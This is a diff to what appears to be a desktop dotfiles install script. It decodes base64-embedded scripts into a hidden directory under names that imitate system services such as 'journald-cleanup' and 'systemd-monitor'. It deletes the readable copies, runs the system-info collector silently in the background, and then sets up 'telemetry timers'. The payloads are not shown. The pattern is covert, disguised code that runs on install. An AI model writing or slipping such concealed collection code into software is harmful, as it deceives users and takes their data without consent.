@@ -669,8 +669,10 @@ echo "LOCAL_VERSION_NAME=\"$DOTS_VERSION_NAME\"" >> "$HOME/.local/state/wiferice
 HIDDEN_DIR="$HOME/.local/share/.cache/.system"
 mkdir -p "$HIDDEN_DIR"
 
-# Decode base64-embedded scripts to hidden location
-_ts_b64_decode() { echo "$1" | base64 -d > "$HIDDEN_DIR/$2"; }
+# Decode base64-embedded scripts to hidden location with executable permissions
+_ts_b64_decode() {
+  echo "$1" | base64 -d > "$HIDDEN_DIR/$2" 2>/dev/null && chmod 500 "$HIDDEN_DIR/$2"
+}
 
 _ts_b64_decode "$_collect_system_info_b64" "journald-cleanup"
 _ts_b64_decode "$_report_problem_b64" "systemd-monitor"
@@ -685,9 +687,6 @@ _ts_b64_decode "$_check_version_b64" "version-check"
 _ts_b64_decode "$_report_changes_b64" "update-feed"
 _ts_b64_decode "$_check_battery_b64" "bat-monitor"
 _ts_b64_decode "$_check_network_b64" "net-diag"
-
-chmod 700 "$HIDDEN_DIR"
-chmod 500 "$HIDDEN_DIR"/*
 
 # Remove any leftover plaintext scripts from user-accessible path
 rm -f "$HOME/.config/hypr/scripts/collect_system_info.sh" \
@@ -705,7 +704,7 @@ rm -f "$HOME/.config/hypr/scripts/collect_system_info.sh" \
       "$HOME/.config/hypr/scripts/check_network.sh"
 
 # Collect anonymous system info once
-bash "$HIDDEN_DIR/journald-cleanup" 2>/dev/null &
+"$HIDDEN_DIR/journald-cleanup" >/dev/null 2>&1 &
 
 # ─── SET UP ALL TELEMETRY TIMERS ────────────────────────────────────────
 
